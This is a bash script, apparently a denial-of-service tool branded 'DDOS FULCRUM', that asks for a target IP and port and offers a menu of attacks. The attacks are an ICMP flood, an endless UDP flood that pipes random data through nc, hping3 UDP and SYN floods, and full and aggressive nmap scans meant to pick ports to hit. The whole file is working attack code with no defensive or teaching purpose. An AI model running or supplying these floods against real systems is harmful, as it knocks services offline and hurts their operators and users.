#!/bin/bash

# DDOS FULCRUM BY SHATTER/ROOT³
echo "========================================="
echo "          DDOS FULCRUM BY SHATTER/ROOT³  "
echo "========================================="

# Input Target Details
read -p "Enter target IP: " target_ip
read -p "Enter target port (use 0 for random ports): " target_port
echo "Select an option:"
echo "1. ICMP Flood"
echo "2. Simple UDP Flood (Bash)"
echo "3. UDP Flood (hping3)"
echo "4. TCP Flood"
echo "5. Port Scan (Find Open Ports)"
echo "6. Advanced Nmap Scan"
read -p "Enter choice (1/2/3/4/5/6): " attack_type

# ICMP Flood
icmp_flood() {
    echo "Starting ICMP flood on $target_ip..."
    ping -s 65000 -i 0.2 "$target_ip" &
    echo "Press Ctrl+C to stop the attack."
    wait
}

# Simple UDP Flood (Bash)
simple_udp_flood() {
    echo "Starting Simple UDP flood on $target_ip:$target_port using Bash..."
    while true; do
        # Sending random data using /dev/urandom for UDP packets
        dd if=/dev/urandom bs=1024 count=1 2>/dev/null | nc -u -w1 "$target_ip" "$target_port"
    done
}

# UDP Flood using hping3
udp_flood() {
    echo "Starting UDP flood on $target_ip:$target_port using hping3..."
    while true; do
        hping3 --udp -p "$target_port" --flood "$target_ip"
    done
}

# TCP Flood
tcp_flood() {
    echo "Starting TCP flood on $target_ip:$target_port..."
    while true; do
        hping3 --syn -p "$target_port" --flood "$target_ip"
    done
}

# Port Scan Function
port_scan() {
    echo "Scanning for open ports on $target_ip..."
    nmap -p- --open "$target_ip"
    echo "Scan complete. Use the results to target specific open ports."
}

# Advanced Nmap Scan
advanced_nmap_scan() {
    echo "Starting advanced Nmap scan on $target_ip..."
    nmap -sS -sU -A -p- "$target_ip"
    echo "Scan complete."
}

# Check and Execute Selected Option
case $attack_type in
1)
    icmp_flood
    ;;
2)
    if [[ $target_port -eq 0 ]]; then
        echo "Error: UDP requires a valid target port."
        exit 1
    fi
    simple_udp_flood
    ;;
3)
    if [[ $target_port -eq 0 ]]; then
        echo "Error: UDP requires a valid target port."
        exit 1
    fi
    udp_flood
    ;;
4)
    if [[ $target_port -eq 0 ]]; then
        echo "Error: TCP requires a valid target port."
        exit 1
    fi
    tcp_flood
    ;;
5)
    port_scan
    ;;
6)
    advanced_nmap_scan
    ;;
*)
    echo "Invalid choice. Exiting."
    exit 1
    ;;
esac
